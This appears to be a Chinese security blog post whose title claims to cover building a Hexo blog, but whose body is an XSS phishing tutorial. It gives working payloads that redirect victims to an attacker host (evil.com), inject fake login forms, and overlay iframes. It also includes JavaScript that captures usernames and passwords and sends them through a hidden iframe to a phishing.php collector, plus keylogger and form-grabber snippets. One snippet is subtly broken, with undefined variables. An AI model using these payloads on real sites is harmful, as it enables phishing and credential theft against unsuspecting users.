<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="hark"><title>在linux利用github和hexo搭建属于自己的博客 | Bug'小虫</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">在linux利用github和hexo搭建属于自己的博客</h1><a id="logo" href="/.">Bug'小虫</a><p class="description">走过黑暗，前面便是光</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">在linux利用github和hexo搭建属于自己的博客</h1><div class="post-meta">Apr 3, 2017<span> | </span><span class="category"><a href="/categories/渗透/">渗透</a></span></div><div class="post-content"><p>XSS比较常见的钓鱼方式主要有三种:</p>
<h3 id="1，XSS重定向钓鱼（XSS-Redirect-Phishing）"><a href="#1，XSS重定向钓鱼（XSS-Redirect-Phishing）" class="headerlink" title="1，XSS重定向钓鱼（XSS Redirect Phishing）"></a>1，XSS重定向钓鱼（XSS Redirect Phishing）</h3><p>这种钓鱼方式是把当前页面重定向到一个钓鱼网站上。假如<a href="http://www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。" target="_blank" rel="noopener">www.bug.com为漏洞网站，那么钓鱼网站www.evil.com就会完全仿冒正常网站的页面内容及行为，从而进行钓鱼等诈骗活动。</a><br>假设<a href="http://www.bug.com上有一处XSS：" target="_blank" rel="noopener">www.bug.com上有一处XSS：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br></pre></td></tr></table></figure></p>
<p>那么，Exploit如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&quot;&apos;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这样便会让用户从当前访问的网站跳转到一个邪恶的钓鱼网站。</p>
<h3 id="2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）"><a href="#2，HTML注入式钓鱼（XSS-HTML-Inject-Phishing）" class="headerlink" title="2，HTML注入式钓鱼（XSS HTML Inject Phishing）"></a>2，HTML注入式钓鱼（XSS HTML Inject Phishing）</h3><p>HTML注入式钓鱼是指直接利用XSS漏洞注射HTML/JavaScript代码到页面中，请看下面的示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=”’&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>这段代码会在正常页面中嵌入一个Form表单.<br>相应的利用代码被附加到URL处，然后构造出一个登录表单，该表单可以覆盖原页面显示，强迫用户输入账号和密码等信息。</p>
<h3 id="3，XSS-跨框架钓鱼（Iframe-Phishing）"><a href="#3，XSS-跨框架钓鱼（Iframe-Phishing）" class="headerlink" title="3，XSS 跨框架钓鱼（Iframe Phishing）"></a>3，XSS 跨框架钓鱼（Iframe Phishing）</h3><p>这种方式是通过<iframe>标签嵌入远程域的一个页面实施钓鱼，和2.3.1中所描述的例子类似，同样是利用Iframe引用第三方的内容伪造登录控件，此时主页面依然处在正常网站的域名下，因此具有很高的迷惑性。</iframe></p>
<p>假设有一个XSS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=[Expliot]</span><br><span class="line">那么，XSS Phishing Exploit如下：</span><br><span class="line">http://www.bug.com/index.php?search=&apos;&gt;&lt;iframe src=“http://www.evil.com” height=&quot;100%&quot; width=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
<p>Iframe的效果可以做得很真实，可以跨框架覆盖整个页面。以百度为例，新建一个HTML文档，输入下述的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=gb2312&quot;&gt;</span><br><span class="line">&lt;title&gt;百度一下，你就知道      &lt;/title&gt;</span><br><span class="line">&lt;body scroll=&quot;no&quot;&gt;</span><br><span class="line">&lt;iframe name=&quot;myFrame&quot; src=&quot;http://www.baidu.com&quot; width=&quot;100%&quot; height=&quot;100%&quot; scrolling =&quot;auto&quot; frameborder=&quot;0&quot; onload=&quot;this.style.height=document.body.clientHeight&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="钓鱼实战"><a href="#钓鱼实战" class="headerlink" title="钓鱼实战"></a>钓鱼实战</h3><p>利用钓鱼获取明文密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Form = document.forms[&quot;userslogin&quot;];</span><br><span class="line">Form.onsubmit = function()&#123;</span><br><span class="line">var iframe = document.createElement(&quot;iframe&quot;);</span><br><span class="line">iframe.style.display = &quot;none&quot;;</span><br><span class="line">alert(Form.user.value);</span><br><span class="line">iframe.src = &quot;http://127.0.0.1/phishing.php?user=&quot;+Form.user.value + &quot;&amp;pass=&quot; + Form.pass.value;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这段代码用来截取用户在登录页面输入的用户名和密码信息，然后提交给当前创建的PHP脚本（<a href="http://127.0.0.1/phishing.php）。" target="_blank" rel="noopener">http://127.0.0.1/phishing.php）。</a></p>
<p>或者可以这样做：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">loginForm = document.forms[&apos; userslogin &apos;];</span><br><span class="line">function parseData()</span><br><span class="line">&#123;</span><br><span class="line">var user = loginForm.user.value;</span><br><span class="line">var pass = loginForm.pass.value;</span><br><span class="line">saveData(username,password);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">function saveData(username,password)</span><br><span class="line">&#123;</span><br><span class="line">var frame=document.createElement(&apos;iframe&apos;);       </span><br><span class="line">frame.src=&quot; http://127.0.0.1/phishing.php?user=&quot; + user + &quot;&amp;pass=&quot; + pass;</span><br><span class="line">frame.style.display=&apos;none&apos;;</span><br><span class="line">document.body.appendChild(frame);</span><br><span class="line">&#125;</span><br><span class="line">loginForm.onsubmit = parseData;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>如图2-21所示，在本地进行测试，用浏览器访问测试页面，然后输入一些信息并提交，处理程序便会获取和记录相关信息，如图2-22所示。</p>
<p>此外，攻击者还可以使用JavaScript编写键盘记录器。<br>假如要劫持链接的onclick事件，可以这样实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(i=0;i&lt;document.links.length;i++)&#123;</span><br><span class="line">document.links[i].onclick = hijack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>要监听键盘onkeydown事件，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.onkeydown=function(e)&#123;</span><br><span class="line">if(!e)e=window.event;</span><br><span class="line">try&#123;hijack();&#125;catch(ex)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面这段代码则可以用于劫持表单的输入框，获取用户输入的用户名和密码信息，并记录下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.onkeyup=function()&#123;</span><br><span class="line">document.forms[&apos;PassFormlogin&apos;].onsubmit=function()&#123;</span><br><span class="line">   pwd = this.PassInputUsername0.value + &apos;|&apos; + this.PassInputPassword0.value;</span><br><span class="line">   log(escape(pwd));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此外，通过JavaScript可以遍历Form表单元素，从而抓取一些重要的字段值，下面是一个简单的POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function grabber()&#123;</span><br><span class="line"> F = document.forms;</span><br><span class="line"> for(var j=0; j&lt;F.length; ++j)</span><br><span class="line"> &#123;</span><br><span class="line">  f = F[j];</span><br><span class="line">  for (i=0; i&lt;f.length; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">   if (f[i].type.toLowerCase() == &quot;password&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Password:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">   else if (f[i].type.toLowerCase() != &quot;submit&quot;)</span><br><span class="line">   &#123;</span><br><span class="line">    alert(&quot;Text:&quot;+f[i].value)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> grabber();</span><br></pre></td></tr></table></figure></p>
<p>JavaScript键盘记录器还可以捕获用户按下的特定键，在IE浏览器中可以使用如下代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function keyDown() &#123;  </span><br><span class="line">　　 　　      var keycode = event.keyCode;  </span><br><span class="line">　　 　　      var realkey = String.fromCharCode(event.keyCode);  </span><br><span class="line">　　   　　     alert(&quot;按键码: &quot; + keycode + &quot; 字符: &quot; + realkey);  </span><br><span class="line">　　     &#125;  </span><br><span class="line">　　     document.onkeydown = keyDown;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
</div><div class="tags"><a href="/tags/XSS/">XSS</a></div><div class="post-nav"><a class="pre" href="/2017/04/03/XSS之shellcode的调用/">XSS之shllcode的调用</a><a class="next" href="/2017/03/17/渗透提权之PR提权/">渗透提权之PR提权</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/herly/">herly</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权/">提权</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/windows/" style="font-size: 15px;">windows</a> <a href="/tags/其他/" style="font-size: 15px;">其他</a> <a href="/tags/javascript/" style="font-size: 15px;">javascript</a> <a href="/tags/parrot/" style="font-size: 15px;">parrot</a> <a href="/tags/注入/" style="font-size: 15px;">注入</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/工具/" style="font-size: 15px;">工具</a> <a href="/tags/资源/" style="font-size: 15px;">资源</a> <a href="/tags/其它/" style="font-size: 15px;">其它</a> <a href="/tags/Windows2003/" style="font-size: 15px;">Windows2003</a> <a href="/tags/windows提权/" style="font-size: 15px;">windows提权</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/rad-linux/" style="font-size: 15px;">rad linux</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/关于本博客/">关于本博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/vim常用命令总结/">vim常用命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/PHP手工注入笔记 /">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/mysql手工注入之load_file()应用/">mysql手工注入之load_file()应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/28/渗透过程中总结的一些技巧/">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/htaccess配合apache 提权/">htaccess配合apach提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/保证session不被服务器因超时注销/">即可保证session不被服务器因超时注销</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/17/linxu安装wps后无法启动的问题解决方法/">linxu安装wps后无法启动的问题解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/">绕过XSS-Filter</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Bug'小虫.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>